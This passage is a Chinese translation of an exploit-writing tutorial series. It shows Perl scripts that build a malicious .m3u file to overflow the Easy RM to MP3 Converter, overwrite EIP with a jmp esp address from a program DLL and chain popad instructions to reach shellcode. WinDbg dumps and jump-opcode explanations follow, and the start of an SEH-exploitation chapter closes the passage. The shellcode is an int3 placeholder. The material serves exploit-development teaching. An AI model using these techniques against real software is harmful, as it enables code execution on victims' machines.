my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 17; #let's pretend this is the only space we have available
my $garbage = "\x44" x 100; #let’s pretend this is the space we need to jump over
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
print "m3u File Created successfully\n";
用Easy RM to MP3打开文件，程序挂掉了，ESP情况如下：
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00104a58 ecx=7c91005d edx=003f0000 esi=77c5fce0 edi=0000666d
eip=42424242 esp=000ff730 ebp=00344158 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0x42424231:
42424242 ?? ???
0:000> d esp
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44 XXXXXXXXXXXXXDDD | => 13 bytes
000ff740 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff750 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff760 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff770 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff780 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff790 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | => garbage
000ff7a0 00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 .AAAAAAAAAAAAAAA | => garbage
0:000> d
000ff7b0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff7c0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff7d0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff7e0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff7f0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff800 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff810 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff820 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
0:000> d
000ff830 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => garbage
000ff840 41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90 AA.............. | => garbage
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ | => NOPS/Shellcode
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ | => NOPS/Shellcode
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA | => NOPS/Shellcode
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => NOPS/Shellcode
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => NOPS/Shellcode
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | => NOPS/Shellcode
假设我们需要直接在ESP中的13 X’s（13字节）里面跳过100 D’s（44）和160 A’s(总共260字节)，末尾再放置shellcode（以NOPs开头，接
着放置一个int3中断，然后A’s(=shellcode)）。一个popad指令相当于从栈中弹出32字节，因此260 bytes = 9 popad’s (-28 bytes)。因此我们需要
在shellcode头部放置NOPs，或者起始于shellcode入口地址+28字节。至此，我们已在shellcode之前放置NOPs，现在可以试着“popad”入
NOPs，然后试着看看程序是否中断在断点处。先再次用jmp esp覆盖EIP（请参考前面的exploit脚本），然后用9个popad指令替代之前的X’s，
再连接“jmp esp”机器码(0xff,0xe4)。
my $file= "test1.m3u";
my $buffersize = 26094;
my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = pack('V',0x01ccf23a); #jmp esp from MSRMCcodec02.dll
my $preshellcode = "X" x 4; # needed to point ESP at next 13 bytes below
$preshellcode=$preshellcode."\x61" x 9; #9 popads
$preshellcode=$preshellcode."\xff\xe4"; #10th and 11th byte, jmp esp
$preshellcode=$preshellcode."\x90\x90\x90"; #fill rest with some nops
my $garbage = "\x44" x 100; #garbage to jump over
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
print "m3u File Created successfully\n";
打开文件后，程序确实中断在断点处。EIP与ESP情况如下：
(f40.5f0): Break instruction exception - code 80000003 (first chance)
eax=90909090 ebx=90904141 ecx=90909090 edx=90909090 esi=41414141 edi=41414141
eip=000ff874 esp=000ff850 ebp=41414141 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0xff863:
000ff874 cc int 3
0:000> d eip
000ff874 cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 .AAAAAAAAAAAAAAA
000ff884 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff894 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8a4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8b4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8c4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8d4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8e4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0:000> d eip-32
000ff842 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff852 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff862 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff872 90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41 ...AAAAAAAAAAAAA
000ff882 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff892 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8a2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8b2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0:000> d esp
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8b0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8c0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
=>popad指令串使ESP指向NOPs，接着跳转到我们所构造的ESP(0xff 0xe4)中，这使得EIP指向NOPs，最后执行到断点处（0x000f874），最
后用真正的shellcode替换A’s：
其它跳转到shellcode的方式（非首选，但仍可尝试）：使用jumpcode简单地跳转到shellcode地址（或者某寄存器的偏移地址）。由于地址/寄存
器可能在每次程序执行时是不同的，这种方法就可能无法每次都成功。为了硬编码地址或寄存器偏移量，你需要查找出跳转指令的机器码，然
后再将机器码放置在“first”/stage1 buffer中，以此跳转到真正的shellcode。现在你应该知道如何去查找汇编指令的机器码了，下面举两个例子：
1．jmp 0x12345678
0:000> a
7c90120e jmp 12345678
jmp 12345678
7c901213
0:000> u 7c90120e
ntdll!DbgBreakPoint:
7c90120e e96544a495 jmp 12345678
=>机器码为 0xe9,0x65,0x44,0xa4,0x95
2. jmp ebx+124h
0:000> a
7c901214 add ebx,124
add ebx,124
7c90121a jmp ebx
jmp ebx
7c90121c
0:000> u 7c901214
ntdll!DbgUserBreakPoint+0x2:
7c901214 81c324010000 add ebx,124h
7c90121a ffe3 jmp ebx
=> 机器码为 0x81,0xc3,0x24,0x01,0x00,0x00 (add ebx 124h)与 0xff,0xe3 (jmp ebx)
Short jumps & conditional jumps
假设你需要跳过一些字节，然后利用一些‘short jump’指令来实现：
—Short jump：jmp的机器码为0xeb，再连接欲跳过的字节数。
如果你想jump 30 bytes，那么其机器码为0x3b,0x1el。
—conditional (short/near) jump:（“如果条件成立则跳转”）：这项技术主要是基于EFLAGS寄存器（CF,OF,PF,SF和ZF）中的一个或多个状态标
志的状态来实现的，如果flags处于指定状态（条件），那么就会跳转到由目的操作数指定的目标地址。这一目标地址是通过相对偏移量指定的
（相对于EIP的当前值）。
例如：假设你想跳过6字节：查看flags(ollydbg)，依靠标记状态，你可以使用下列机器码中的一个来实现。
例如zero flag为1，那么你可以使用机器码0x74，再连接你想跳过的字节数（在此为0x06）。
下列是关于跳转指令对应的机器码及flag条件的表单：
如上所示，你可以利用值为0的ECX寄存器来实现short jump。由于当系统中发生异常时，windows SHE保护机制（具体参见本系列教程中第
三部分）会将各寄存器清零，因此有时你可以使用0xe3作为跳转指令的机器码（如果ECX=00000000）。
注 意 ： 你 可 以 在 下 列 地 址 中 找 到 更 多 或 其 它 关 于 实 现 2 byte jump 的 信 息 （ 前 向 / 后 向 / 反 跳 转 ）：
http://www.geocities.com/thestarman3/asm/2bytejumps.htm
后向跳转（backward jump）
如果你需要执行一后向跳转（以负偏移量实现跳转）：获取负偏移量，并将其转换成十六进制，最后以这个双字节的十六进制值为参数实现跳转
（\xeb或\xe9）。
例如：回跳7字节：-7=FFFFFFF9，因此jump-7的机器码为"\xeb\xf9\xff\xff"。
例如：回跳400字节：-400 = FFFFFE70,因此 jump -400 bytes = "\xe9\x70\xfe\xff\xff"（正如你所看到的，这机器码共5字节长）。然而有时你可
能需要在dword大小（限制为4字节）的空间中实现跳转，那么你可需要执行多个短跳转，才能达到你想到达的地址。
Exploit 编写教程第三篇：基于 SEH 的 Exploit
译：看雪论坛-moonife-2009-11-26
在 Exploit 编写系列教程的第二篇中，我们讨论了传统的缓冲区溢出利用和如何编写有效的
exploit 以及各种跳转到 shellcode 的技术。在前文的例子中，我们可以直接重写 EIP 和拥有
足够大的缓冲区存放我们的 shellcode。在那个上面，我们可以使用不同的跳转技术来达到
我们的目的。但并不是所有的溢出都是那么简单的。
今天，我们将看到另一种使用异常处理机制的漏洞利用技术。
什么是异常处理例程？
一个异常处理例程是内嵌在程序中的一段代码，用来处理在程序中抛出的异常。一个典型的
异常处理例程如下所示：
try
{
//run stuff. If an exception occurs, go to  code
}
catch
{
// run stuff when exception occurs
}
马上看一下在栈中try & catch的位置以及他们之间是如何关联的：
Windows中有一个默认的SEH（结构化异常处理例程）捕捉异常。如果Windows捕捉到了一
个异常，你会看到“XXX遇到问题需要关闭”的弹窗。这通常是默认异常处理的结果。很
明显，为了编写健壮的软件，开发人员应该要用开发语言指定异常处理例程，并且把Windows
的默认SEH作为最终的异常处理手段。当使用语言式的异常处理（如：try...catch），必须要
按照底层的操作系统生成异常处理例程代码的链接和调用（如果没有一个异常处理例程被调
用或有效的异常处理例程无法处理异常，那么Windows SEH将被使用
（UnhandledExceptionFilter））。所以当执行一个错误或非法指令时，程序将有机会来处理
这个异常和做些什么。如果没指定异常处理例程的话，那么操作系统将接管，捕捉异常和弹
窗，并询问是否要把错误报告发送给MS。
为了能够让程序发生异常时跳到catch{...}代码，在栈中将保存有指向这个异常处理例程代码
的指针（每一个代码块），每一个代码块都拥有自己的栈帧，指向这个异常处理例程代码的
指针就属于这个帧中一部分。从另一方面讲就是：每一个函数/过程都有一个栈帧，如果在
这函数/过程中有实现异常处理，那么基于帧的异常处理例程信息将以exception_registration
结构储存在栈中。
In the main